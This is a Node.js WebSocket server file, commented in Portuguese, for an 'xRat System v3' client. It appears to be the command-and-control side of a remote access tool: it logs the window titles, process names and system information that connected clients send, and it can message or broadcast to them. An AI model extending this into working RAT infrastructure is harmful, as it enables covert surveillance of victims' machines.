// =============================================================================
// Servidor WebSocket para xRat System v3 - Cliente
// =============================================================================
// Descrição: Servidor simples para testar conexão socket com cliente C++
// Porta: 8080
// Endpoint: /cli/ws
// Autor: Desenvolvedor C++
// Data: 12/08/2025
// =============================================================================

const WebSocket = require('ws');
const express = require('express');
const http = require('http');

// Configurações do servidor
const PORT = 8080;
const HOST = '0.0.0.0'; // Aceita conexões de qualquer IP

// Criar aplicação Express
const app = express();
const server = http.createServer(app);

// Estatísticas do servidor
let stats = {
    clientsConnected: 0,
    totalConnections: 0,
    messagesReceived: 0,
    messagesSent: 0,
    startTime: new Date(),
    clients: new Map()
};

// Middleware para logs
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url} - ${req.ip}`);
    next();
});

// Rota básica para teste
app.get('/', (req, res) => {
    res.json({
        name: 'xRat WebSocket Server',
        version: '1.0.0',
        status: 'running',
        port: PORT,
        stats: {
            ...stats,
            uptime: Math.floor((Date.now() - stats.startTime) / 1000) + 's'
        }
    });
});

// Rota de status
app.get('/status', (req, res) => {
    res.json({
        status: 'ok',
        clients: stats.clientsConnected,
        uptime: Math.floor((Date.now() - stats.startTime) / 1000),
        memory: process.memoryUsage()
    });
});

// Criar servidor WebSocket no endpoint específico
const wss = new WebSocket.Server({ 
    server: server,
    path: '/cli/ws'
});

console.log(`[INFO] Servidor WebSocket criado no endpoint: /cli/ws`);

// Função para gerar ID único do cliente
function generateClientId() {
    return 'client_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Função para broadcast para todos os clientes
function broadcast(message, excludeClient = null) {
    const data = JSON.stringify({
        type: 'broadcast',
        message: message,
        timestamp: new Date().toISOString(),
        from: 'server'
    });

    wss.clients.forEach(client => {
        if (client !== excludeClient && client.readyState === WebSocket.OPEN) {
            client.send(data);
            stats.messagesSent++;
        }
    });
}

// Função para enviar mensagem para cliente específico
function sendToClient(clientId, message) {
    const client = stats.clients.get(clientId);
    if (client && client.ws.readyState === WebSocket.OPEN) {
        const data = JSON.stringify({
            type: 'message',
            message: message,
            timestamp: new Date().toISOString(),
            to: clientId,
            from: 'server'
        });
        client.ws.send(data);
        stats.messagesSent++;
        return true;
    }
    return false;
}

// Event listener para novas conexões WebSocket
wss.on('connection', (ws, req) => {
    const clientId = generateClientId();
    const clientIP = req.socket.remoteAddress;
    
    console.log(`[CONEXÃO] Novo cliente conectado: ${clientId} de ${clientIP}`);
    
    // Adicionar cliente às estatísticas
    stats.clientsConnected++;
    stats.totalConnections++;
    stats.clients.set(clientId, {
        ws: ws,
        id: clientId,
        ip: clientIP,
        connectedAt: new Date(),
        lastActivity: new Date()
    });

    // Enviar mensagem de boas-vindas
    const welcomeMessage = {
        type: 'welcome',
        clientId: clientId,
        message: 'Conectado ao servidor xRat WebSocket',
        timestamp: new Date().toISOString(),
        serverInfo: {
            name: 'xRat WebSocket Server',
            version: '1.0.0'
        }
    };

    ws.send(JSON.stringify(welcomeMessage));
    stats.messagesSent++;

    // Notificar outros clientes sobre nova conexão
    broadcast(`Cliente ${clientId} se conectou`, ws);

    // Event listener para mensagens recebidas
    ws.on('message', (data) => {
        stats.messagesReceived++;
        stats.clients.get(clientId).lastActivity = new Date();

        try {
            const message = data.toString();
            console.log(`[MENSAGEM] De ${clientId}: ${message}`);

            // Tentar fazer parse JSON
            let parsedMessage;
            try {
                parsedMessage = JSON.parse(message);
            } catch (e) {
                // Se não for JSON, tratar como string simples
                parsedMessage = {
                    type: 'text',
                    content: message
                };
            }

            // Processar diferentes tipos de mensagem
            switch (parsedMessage.type) {
                case 'ping':
                    // Responder com pong
                    ws.send(JSON.stringify({
                        type: 'pong',
                        timestamp: new Date().toISOString(),
                        originalTimestamp: parsedMessage.timestamp
                    }));
                    stats.messagesSent++;
                    break;

                case 'window_info':
                    // Log informações de janela do cliente
                    console.log(`[JANELA] ${clientId}: ${parsedMessage.windowTitle} (${parsedMessage.processName})`);
                    break;

                case 'system_info':
                    // Log informações do sistema
                    console.log(`[SISTEMA] ${clientId}: ${JSON.stringify(parsedMessage.data)}`);
                    break;

                case 'broadcast':
                    // Retransmitir para outros clientes
                    broadcast(`${clientId}: ${parsedMessage.message}`, ws);
                    break;

                default:
                    // Echo da mensagem para teste
                    const echoResponse = {
                        type: 'echo',
                        originalMessage: parsedMessage,
                        timestamp: new Date().toISOString(),
                        from: 'server'
                    };
                    ws.send(JSON.stringify(echoResponse));
                    stats.messagesSent++;
            }

        } catch (error) {
            console.error(`[ERRO] Erro ao processar mensagem de ${clientId}: ${error.message}`);
            
            // Enviar erro de volta para o cliente
            const errorResponse = {
                type: 'error',
                message: 'Erro ao processar mensagem',
                error: error.message,
                timestamp: new Date().toISOString()
            };
            ws.send(JSON.stringify(errorResponse));
            stats.messagesSent++;
        }
    });

    // Event listener para erro na conexão
    ws.on('error', (error) => {
        console.error(`[ERRO] Erro na conexão ${clientId}: ${error.message}`);
    });

    // Event listener para desconexão
    ws.on('close', (code, reason) => {
        console.log(`[DESCONEXÃO] Cliente ${clientId} desconectado. Código: ${code}, Motivo: ${reason}`);
        
        // Remover cliente das estatísticas
        stats.clientsConnected--;
        stats.clients.delete(clientId);

        // Notificar outros clientes sobre desconexão
        broadcast(`Cliente ${clientId} se desconectou`);
    });

    // Enviar ping periódico para manter conexão viva
    const pingInterval = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({
                type: 'ping',
                timestamp: new Date().toISOString()
            }));
            stats.messagesSent++;
        } else {
            clearInterval(pingInterval);
        }
    }, 30000); // Ping a cada 30 segundos
});

// Event listener para erro no servidor WebSocket
wss.on('error', (error) => {
    console.error(`[ERRO] Erro no servidor WebSocket: ${error.message}`);
});

// Iniciar o servidor
server.listen(PORT, HOST, () => {
    console.log('=============================================================================');
    console.log('  xRat WebSocket Server v1.0.0');
    console.log('=============================================================================');
    console.log(`[INFO] Servidor rodando em: http://${HOST}:${PORT}`);
    console.log(`[INFO] WebSocket endpoint: ws://${HOST}:${PORT}/cli/ws`);
    console.log(`[INFO] Status endpoint: http://${HOST}:${PORT}/status`);
    console.log(`[INFO] Data/Hora: ${new Date().toISOString()}`);
    console.log('=============================================================================');
    console.log('[INFO] Aguardando conexões de clientes...');
    console.log('');
});

// Tratamento graceful de shutdown
process.on('SIGINT', () => {
    console.log('\n[INFO] Recebido sinal de interrupção (SIGINT)');
    console.log('[INFO] Fechando conexões...');
    
    // Fechar todas as conexões WebSocket
    wss.clients.forEach(ws => {
        ws.close(1000, 'Servidor sendo desligado');
    });

    // Fechar servidor
    server.close(() => {
        console.log('[INFO] Servidor encerrado com sucesso');
        process.exit(0);
    });
});

process.on('SIGTERM', () => {
    console.log('\n[INFO] Recebido sinal de término (SIGTERM)');
    server.close(() => {
        console.log('[INFO] Servidor encerrado com sucesso');
        process.exit(0);
    });
});

// Exportar para testes
module.exports = { server, wss, stats };
